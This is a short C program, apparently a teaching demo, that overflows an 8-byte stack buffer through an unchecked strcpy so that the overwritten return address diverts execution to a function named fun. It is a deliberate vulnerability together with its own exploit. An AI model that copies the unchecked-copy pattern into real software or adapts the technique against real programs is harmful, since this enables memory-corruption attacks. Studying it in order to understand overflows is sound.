#include <stdio.h>
#include <string.h>

void overflow(const char* input)
{
    char buf[8];
    printf("Virtual address of 'buf' = Ox%p\n", buf);
    strcpy(buf,input);
}

void fun()
{
    printf("Function 'fun' has been called without an explicitly invocation.\n");
    printf("Buffer Overflow attack succeeded!\n");
}

int main(int argc, char* argv[])
{
    printf("Virtual address of 'overflow' = Ox%p\n",overflow);
    printf("Virtual address of 'fun' = Ox%p\n",fun);
    char input[30]="01234567890123456789";
    char add[5];
    *((int*)add) = fun;
    add[4] = 0;
    strcat(input, add);
    overflow(input);
    return 0;
}